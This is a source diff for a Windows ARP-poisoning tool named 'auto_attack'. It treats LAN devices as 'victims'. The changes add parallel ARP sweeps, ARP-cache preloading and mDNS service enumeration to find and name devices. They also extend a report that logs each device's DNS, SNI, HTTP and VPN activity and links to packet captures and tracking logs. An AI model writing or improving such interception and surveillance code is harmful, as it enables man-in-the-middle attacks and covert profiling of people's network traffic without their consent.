@@ -90,6 +90,7 @@ static void closeAllCaptures();
 static void cmdDetail(const std::string& ip, int n);
 static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                     const unsigned char* dstMac, const char* dstIp, int op);
+static pcap_t* openHandleFor(const std::string& guid, bool sending);
 
 static pcap_t*          g_pcap     = nullptr;
 static pcap_t*          g_pcapSend = nullptr;
@@ -211,7 +212,7 @@ static bool sendFrame(const unsigned char* f, int len) {
     return false;
 }
 
-static void sendArp(pcap_t* /*pc*/, const char* srcIp, const unsigned char* srcMac,
+static void sendArp(pcap_t* pc, const char* srcIp, const unsigned char* srcMac,
                     const unsigned char* dstMac, const char* dstIp, int op) {
     unsigned char f[42];
     unsigned char bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
@@ -233,6 +234,13 @@ static void sendArp(pcap_t* /*pc*/, const char* srcIp, const unsigned char* srcM
     memset(&f[32], 0, 6);
     memcpy(&f[38], &dip, 4);
 
+    // an explicit handle lets the parallel sweep use one send handle per
+    // thread; pcap_sendpacket is safe across distinct handles but not
+    // concurrently on the same one
+    if (pc) {
+        if (pcap_sendpacket(pc, f, 42) == 0) g_sent++;
+        return;
+    }
     sendFrame(f, 42);
 }
 
@@ -2143,28 +2151,55 @@ static int buildNbstatQuery(unsigned char* b, unsigned short id) {
     return 50;
 }
 
-static int buildPtrQuery(unsigned char* b, const char* ip, bool qu, unsigned short id) {
-    unsigned a1, b1, c1, d1;
-    if (sscanf(ip, "%u.%u.%u.%u", &a1, &b1, &c1, &d1) != 4) return 0;
-    int p = 0;
-    b[p++] = (unsigned char)(id >> 8); b[p++] = (unsigned char)(id & 0xff);
-    b[p++] = 0x00; b[p++] = 0x00;
-    b[p++] = 0x00; b[p++] = 0x01;
-    b[p++] = 0x00; b[p++] = 0x00; b[p++] = 0x00;
-    char lab[64];
-    snprintf(lab, sizeof(lab), "%u.%u.%u.%u.in-addr.arpa", d1, c1, b1, a1);
-    char* sp = lab;
+// append a DNS name in label form ("a.b.c" -> 1 a 1 b 1 c 0)
+static void appendDnsName(unsigned char* b, int& p, const char* name) {
+    const char* sp = name;
     while (sp && *sp) {
-        char* dot = strchr(sp, '.');
+        const char* dot = strchr(sp, '.');
         int seg = dot ? (int)(dot - sp) : (int)strlen(sp);
+        if (seg <= 0) break;
         b[p++] = (unsigned char)seg;
         memcpy(b + p, sp, seg);
         p += seg;
         sp = dot ? dot + 1 : nullptr;
     }
     b[p++] = 0x00;
-    b[p++] = 0x00; b[p++] = 0x0C;
-    b[p++] = 0x00; b[p++] = qu ? 0x81 : 0x01;
+}
+
+static int buildPtrQuery(unsigned char* b, const char* ip, bool qu, unsigned short id) {
+    unsigned a1, b1, c1, d1;
+    if (sscanf(ip, "%u.%u.%u.%u", &a1, &b1, &c1, &d1) != 4) return 0;
+    int p = 0;
+    b[p++] = (unsigned char)(id >> 8); b[p++] = (unsigned char)(id & 0xff);
+    b[p++] = 0x00; b[p++] = 0x00;   // flags: standard query
+    b[p++] = 0x00; b[p++] = 0x01;   // QDCOUNT = 1
+    b[p++] = 0x00; b[p++] = 0x00;   // ANCOUNT = 0
+    b[p++] = 0x00; b[p++] = 0x00;   // NSCOUNT = 0
+    b[p++] = 0x00; b[p++] = 0x00;   // ARCOUNT = 0
+    char lab[64];
+    snprintf(lab, sizeof(lab), "%u.%u.%u.%u.in-addr.arpa", d1, c1, b1, a1);
+    appendDnsName(b, p, lab);
+    b[p++] = 0x00; b[p++] = 0x0C;                 // QTYPE  = PTR
+    // the mDNS "QU" (unicast-response) bit is the TOP bit of QCLASS, i.e.
+    // 0x8001 - not 0x0081, which is a class no responder understands
+    b[p++] = qu ? 0x80 : 0x00; b[p++] = 0x01;     // QCLASS = IN [| QU]
+    return p;
+}
+
+// mDNS query for a DNS-SD service type, e.g. "_googlecast._tcp.local".
+// The PTR answers name the instances ("Salon._googlecast._tcp.local") and the
+// SRV/A records that ride along map those friendly names onto device IPs.
+static int buildMdnsQuery(unsigned char* b, const char* name, unsigned short id) {
+    int p = 0;
+    b[p++] = (unsigned char)(id >> 8); b[p++] = (unsigned char)(id & 0xff);
+    b[p++] = 0x00; b[p++] = 0x00;   // flags
+    b[p++] = 0x00; b[p++] = 0x01;   // QDCOUNT
+    b[p++] = 0x00; b[p++] = 0x00;   // ANCOUNT
+    b[p++] = 0x00; b[p++] = 0x00;   // NSCOUNT
+    b[p++] = 0x00; b[p++] = 0x00;   // ARCOUNT
+    appendDnsName(b, p, name);
+    b[p++] = 0x00; b[p++] = 0x0C;   // QTYPE  = PTR
+    b[p++] = 0x80; b[p++] = 0x01;   // QCLASS = IN + unicast-response
     return p;
 }
 
@@ -2564,7 +2599,7 @@ static void learnFromSsdp(const std::vector<Victim>& snap) {
 
     struct Hit { std::string ip; int port; std::string path; };
     std::vector<Hit> hits;
-    DWORD end = GetTickCount() + 1200;
+    DWORD end = GetTickCount() + 800;
     while ((LONG)(end - GetTickCount()) > 0) {
         fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
         timeval tv{0, 100000};
@@ -2609,9 +2644,9 @@ static void learnFromSsdp(const std::vector<Victim>& snap) {
 
     int fetched = 0;
     for (auto& h : hits) {
-        if (fetched >= 6) break;
+        if (fetched >= 4) break;
         if (victimNamePrio(h.ip) >= 6) continue;  // already has a friendly name
-        std::string xml = httpGetSmall(h.ip, h.port, h.path, 650);
+        std::string xml = httpGetSmall(h.ip, h.port, h.path, 500);
         std::string nm = xmlElement(xml, "friendlyName");
         if (nm.empty()) nm = xmlElement(xml, "modelName");
         if (!nm.empty()) { setNameForIp(h.ip, nm, 6); fetched++; }
@@ -2672,8 +2707,36 @@ static void resolveNames() {
         }
     }
 
+    // DNS-SD service enumeration.  Phones, TVs, printers, NAS boxes and
+    // speakers answer these with PTR/SRV/A records whose instance names are
+    // the friendly names shown in their setup apps ("Living Room TV").
+    // Sent once (not per device) because the answers are multicast.
+    {
+        static const char* svc[] = {
+            "_services._dns-sd._udp.local",
+            "_googlecast._tcp.local", "_airplay._tcp.local",
+            "_raop._tcp.local",       "_spotify-connect._tcp.local",
+            "_sonos._tcp.local",      "_amzn-wplay._tcp.local",
+            "_ipp._tcp.local",        "_printer._tcp.local",
+            "_http._tcp.local",       "_workstation._tcp.local",
+            "_smb._tcp.local",        "_device-info._tcp.local",
+            "_hap._tcp.local"
+        };
+        sockaddr_in m{};
+        m.sin_family = AF_INET; m.sin_port = htons(5353);
+        inet_pton(AF_INET, "224.0.0.251", &m.sin_addr);
+        unsigned short sid = (unsigned short)(baseId + 0x600);
+        for (const char* name : svc) {
+            unsigned char q[160];
+            int len = buildMdnsQuery(q, name, sid++);
+            // multicast is lossy - repeat each probe
+            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
+            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
+        }
+    }
+
     int replies = 0;
-    DWORD deadline = GetTickCount() + 1400;
+    DWORD deadline = GetTickCount() + 1100;
     while ((LONG)(deadline - GetTickCount()) > 0) {
         fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
         timeval tv; tv.tv_sec = 0; tv.tv_usec = 80000;
@@ -2688,14 +2751,15 @@ static void resolveNames() {
         int port = ntohs(from.sin_port);
 
         if (strcmp(rip, g_gatewayIp.c_str()) == 0 && port == 53) {
+            learnFromDns(buf, n);
             std::string owner, nm;
             nm = parsePtrAnswer(buf, n, &owner);
             std::string ownerIp = revToIp(owner);
-            if (!nm.empty() && !ownerIp.empty()) {
+            std::string clean;
+            if (!nm.empty() && !ownerIp.empty() && plausibleHostName(nm, clean)) {
                 for (auto& v : snap)
                     if (v.ip == ownerIp) {
-                        sanitizeName(nm);
-                        if (!nm.empty() && 1 >= v.namePrio) { v.name = nm; v.namePrio = 1; }
+                        if (1 >= v.namePrio) { v.name = clean; v.namePrio = 1; }
                     }
             }
             continue;
@@ -2710,10 +2774,13 @@ static void resolveNames() {
         else if (port == 5355) { nm = parsePtrAnswer(buf, n); prio = 3; }
         else if (port == 5353) { nm = parsePtrAnswer(buf, n); prio = 2; }
         else                   { nm = parsePtrAnswer(buf, n); prio = 1; }
+        // harvest A/SRV/PTR records too: mDNS service answers carry the
+        // useful host mapping in their answer/additional sections
+        if (port != 137) learnFromDns(buf, n);
         if (nm.empty()) continue;
-        sanitizeName(nm);
-        if (nm.empty()) continue;
-        if (prio >= it->namePrio) { it->name = nm; it->namePrio = prio; }
+        std::string clean;
+        if (!plausibleHostName(nm, clean)) continue;
+        if (prio >= it->namePrio) { it->name = clean; it->namePrio = prio; }
     }
     closesocket(s);
 
@@ -2765,7 +2832,7 @@ static void resolveNames() {
                 j->done = true;
             }).detach();
         }
-        DWORD end2 = GetTickCount() + 1500;
+        DWORD end2 = GetTickCount() + 1200;
         while ((LONG)(end2 - GetTickCount()) > 0) {
             bool all = true;
             for (auto& j : jobs) if (!j->done) { all = false; break; }
@@ -2789,8 +2856,16 @@ static void resolveNames() {
         if (got) PF("[+] windows resolver named %d more host(s)\n", got);
     }
 
-    // last resort: ask TVs/printers/routers over SSDP/UPnP
-    learnFromSsdp(snap);
+    // last resort, and only when something is still unnamed: ask
+    // TVs/printers/routers over SSDP/UPnP (this does slow HTTP fetches)
+    {
+        bool missing2 = false;
+        {
+            std::lock_guard<std::mutex> lk(g_vmutex);
+            for (auto& v : g_victims) if (v.name.empty()) { missing2 = true; break; }
+        }
+        if (missing2) learnFromSsdp(snap);
+    }
 
     int named = 0, total = 0;
     {
@@ -2867,6 +2942,43 @@ static void startAttack() {
     PF("[+] poisoning active\n");
 }
 
+// Devices already in the OS neighbour/ARP cache are known instantly; loading
+// them before the ARP sweep makes a re-scan show the whole LAN immediately
+// instead of waiting for every device to answer a probe.
+static void warmFromArpCache() {
+    ULONG size = 0;
+    if (GetIpNetTable(nullptr, &size, TRUE) != ERROR_INSUFFICIENT_BUFFER) return;
+    PMIB_IPNETTABLE t = (PMIB_IPNETTABLE)malloc(size);
+    if (!t) return;
+    if (GetIpNetTable(t, &size, TRUE) != NO_ERROR) { free(t); return; }
+    std::string base = g_myIp;
+    size_t dot = base.find_last_of('.');
+    if (dot == std::string::npos) { free(t); return; }
+    base = base.substr(0, dot);
+    int added = 0;
+    for (DWORD i = 0; i < t->dwNumEntries; ++i) {
+        MIB_IPNETROW& r = t->table[i];
+        if (r.dwPhysAddrLen != 6) continue;
+        if (r.bPhysAddr[0] == 0 && r.bPhysAddr[1] == 0 && r.bPhysAddr[2] == 0 &&
+            r.bPhysAddr[3] == 0 && r.bPhysAddr[4] == 0 && r.bPhysAddr[5] == 0)
+            continue;
+        struct in_addr a;
+        a.s_addr = r.dwAddr;             // already network byte order
+        char ip[32];
+        snprintf(ip, sizeof(ip), "%s", inet_ntoa(a));
+        // only this subnet: the neighbour table can hold other adapters' rows
+        if (strncmp(ip, base.c_str(), base.size()) != 0 || ip[base.size()] != '.')
+            continue;
+        char mac[24];
+        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+                 r.bPhysAddr[0], r.bPhysAddr[1], r.bPhysAddr[2],
+                 r.bPhysAddr[3], r.bPhysAddr[4], r.bPhysAddr[5]);
+        if (learnVictim(ip, mac)) added++;
+    }
+    free(t);
+    if (added) PF("[*] %d host(s) preloaded from the ARP cache\n", added);
+}
+
 // scan runs on its own thread so the command loop (and therefore _dump /
 // status) stays responsive while the network is being swept
 static void scanNetworkBody() {
@@ -2880,16 +2992,36 @@ static void scanNetworkBody() {
     base = base.substr(0, last);
     PF("[*] scanning %s.0/24 ...\n", base.c_str());
 
-    for (int round = 0; round < 2; ++round) {
-        for (int i = 1; i < 255; ++i) {
-            if (i % 32 == 0) Sleep(3);
-            char ip[16];
-            snprintf(ip, sizeof(ip), "%s.%d", base.c_str(), i);
-            sendArp(nullptr, g_myIp.c_str(), g_myMac, nullptr, ip, 1);
-        }
-        // a second sweep catches devices that were slow to answer the first
-        Sleep(round == 0 ? 400 : 1800);
+    warmFromArpCache();
+
+    // parallel ARP sweep: a handful of distinct send handles, each covering a
+    // slice of the subnet.  Only the first round should need to wake sleeping
+    // devices, so the second round uses a much shorter settling pause.
+    std::vector<pcap_t*> senders;
+    for (int t = 0; t < 4; ++t) {
+        pcap_t* h = openHandleFor(g_ifGuid, true);
+        if (h) senders.push_back(h);
     }
+    if (senders.empty()) senders.push_back(nullptr);   // fall back to shared handle
+
+    const int step = (int)senders.size();
+    for (int round = 0; round < 2; ++round) {
+        std::vector<std::thread> ts;
+        for (int t = 0; t < step; ++t) {
+            pcap_t* h = senders[t];
+            ts.emplace_back([h, t, step, base]() {
+                for (int i = 1 + t; i < 255; i += step) {
+                    char ip[16];
+                    snprintf(ip, sizeof(ip), "%s.%d", base.c_str(), i);
+                    sendArp(h, g_myIp.c_str(), g_myMac, nullptr, ip, 1);
+                }
+            });
+        }
+        for (auto& th : ts) th.join();
+        // a short second sweep catches devices that were slow to answer
+        Sleep(round == 0 ? 350 : 900);
+    }
+    for (pcap_t* h : senders) if (h) pcap_close(h);
     resolveNames();
 
     std::vector<Victim> snap;
@@ -3254,6 +3386,25 @@ static void cmdDetail(const std::string& ip, int lines) {
     cmdStats(ip);
 }
 
+// list regular files in a directory (non-recursive)
+struct ReportFile { std::string name; unsigned long long size; };
+static std::vector<ReportFile> listReportFiles(const char* dir, const char* pattern) {
+    std::vector<ReportFile> out;
+    std::string spec = std::string(dir) + "\\" + pattern;
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(spec.c_str(), &fd);
+    if (h == INVALID_HANDLE_VALUE) return out;
+    do {
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
+        ReportFile e;
+        e.name = fd.cFileName;
+        e.size = ((unsigned long long)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
+        out.push_back(e);
+    } while (FindNextFileA(h, &fd));
+    FindClose(h);
+    return out;
+}
+
 // write atk\report.html and atk\report.json from the current session state
 static void cmdReport() {
     std::vector<Victim> vs;
@@ -3281,7 +3432,10 @@ static void cmdReport() {
                "h1{font-size:20px}h2{font-size:15px;margin-top:26px;color:#ffaa3c}"
                "table{border-collapse:collapse;width:100%%;margin-top:8px}"
                "th,td{border:1px solid #333;padding:5px 8px;font-size:12px;text-align:left;vertical-align:top}"
-               "th{background:#20242c}.m{color:#8aa}</style></head><body>");
+               "th{background:#20242c}.m{color:#8aa}"
+               "pre.tl{background:#1b1e24;border:1px solid #333;padding:8px;font-size:12px;"
+               "max-height:240px;overflow:auto;white-space:pre-wrap}"
+               "a{color:#7cf}</style></head><body>");
     fprintf(f, "<h1>auto_attack &mdash; session report</h1>");
     fprintf(f, "<div class=\"m\">generated %s &middot; this host %s &middot; gateway %s</div>",
             htmlEscape(stamp).c_str(), g_myIp.c_str(), g_gatewayIp.c_str());
@@ -3347,6 +3501,49 @@ static void cmdReport() {
                     htmlEscape(r.targetIp).c_str(), htmlEscape(r.victim).c_str());
         fprintf(f, "</table>");
     }
+
+    // per-device recent activity (the events each device generated)
+    {
+        bool any = false;
+        for (auto& a : acts) if (!a.recent.empty()) { any = true; break; }
+        if (any) {
+            fprintf(f, "<h2>Recent activity (timeline)</h2>");
+            for (auto& a : acts) {
+                if (a.recent.empty()) continue;
+                std::string nm;
+                for (auto& v : vs) if (v.ip == a.ip) { nm = v.name; break; }
+                fprintf(f, "<h3>%s%s%s</h3><pre class=\"tl\">",
+                        htmlEscape(a.ip).c_str(),
+                        nm.empty() ? "" : " &middot; ",
+                        htmlEscape(nm).c_str());
+                size_t start = a.recent.size() > 40 ? a.recent.size() - 40 : 0;
+                for (size_t k = start; k < a.recent.size(); ++k)
+                    fprintf(f, "%s<br>", htmlEscape(a.recent[k]).c_str());
+                fprintf(f, "</pre>");
+            }
+        }
+    }
+
+    // captures and logs produced this session, linked with relative paths
+    {
+        std::vector<ReportFile> caps = listReportFiles("atk\\captures", "*.pcap");
+        std::vector<ReportFile> logs = listReportFiles("atk\\tracks", "track_*.log");
+        if (!caps.empty() || !logs.empty()) {
+            fprintf(f, "<h2>Captures &amp; logs</h2><table>"
+                       "<tr><th>File</th><th>Size</th></tr>");
+            for (auto& c : caps)
+                fprintf(f, "<tr><td><a href=\"captures/%s\">captures/%s</a></td>"
+                           "<td>%llu B</td></tr>",
+                        htmlEscape(c.name).c_str(), htmlEscape(c.name).c_str(), c.size);
+            for (auto& l : logs)
+                fprintf(f, "<tr><td><a href=\"tracks/%s\">tracks/%s</a></td>"
+                           "<td>%llu B</td></tr>",
+                        htmlEscape(l.name).c_str(), htmlEscape(l.name).c_str(), l.size);
+            fprintf(f, "</table>");
+            fprintf(f, "<div class=\"m\">pcap files open in Wireshark; track logs are plain text.</div>");
+        }
+    }
+
     fprintf(f, "</body></html>");
     fclose(f);
 
@@ -3389,12 +3586,19 @@ static void cmdReport() {
             fprintf(j, "    {\"ip\":\"%s\",\"dns\":%ld,\"sni\":%ld,\"http\":%ld,"
                        "\"events\":%llu,\"up\":%llu,\"down\":%llu,"
                        "\"topProto\":\"%s\",\"topPeer\":\"%s\","
-                       "\"quic\":%ld,\"doh\":%ld,\"dot\":%ld,\"vpn\":%ld,\"dnsDirect\":%ld}%s\n",
+                       "\"quic\":%ld,\"doh\":%ld,\"dot\":%ld,\"vpn\":%ld,\"dnsDirect\":%ld,"
+                       "\"recent\":[",
                     jesc(a.ip).c_str(), a.dnsCount, a.sniCount, a.httpCount,
                     a.events, a.byUp, a.byDown,
                     jesc(pk).c_str(), jesc(ek).c_str(),
-                    a.quic, a.doh, a.dot, a.vpn, a.dnsDirect,
-                    i + 1 < acts.size() ? "," : "");
+                    a.quic, a.doh, a.dot, a.vpn, a.dnsDirect);
+            {
+                size_t start = a.recent.size() > 50 ? a.recent.size() - 50 : 0;
+                for (size_t k = start; k < a.recent.size(); ++k)
+                    fprintf(j, "%s\"%s\"", k == start ? "" : ",",
+                            jesc(a.recent[k]).c_str());
+            }
+            fprintf(j, "]}%s\n", i + 1 < acts.size() ? "," : "");
         }
         fprintf(j, "  ],\n  \"rules\": [\n");
         for (size_t i = 0; i < rules.size(); ++i) {
@@ -3405,7 +3609,19 @@ static void cmdReport() {
                     jesc(r.targetIp).c_str(), jesc(r.victim).c_str(),
                     i + 1 < rules.size() ? "," : "");
         }
-        fprintf(j, "  ]\n}\n");
+        fprintf(j, "  ],\n  \"artifacts\": {\n    \"captures\": [");
+        {
+            std::vector<ReportFile> caps = listReportFiles("atk\\captures", "*.pcap");
+            for (size_t i = 0; i < caps.size(); ++i)
+                fprintf(j, "%s\"captures/%s\"", i ? "," : "", jesc(caps[i].name).c_str());
+        }
+        fprintf(j, "],\n    \"tracks\": [");
+        {
+            std::vector<ReportFile> logs = listReportFiles("atk\\tracks", "track_*.log");
+            for (size_t i = 0; i < logs.size(); ++i)
+                fprintf(j, "%s\"tracks/%s\"", i ? "," : "", jesc(logs[i].name).c_str());
+        }
+        fprintf(j, "]\n  }\n}\n");
         fclose(j);
     }
     PF("[+] report -> atk\\report.html (%d device(s), %d activity row(s))\n",
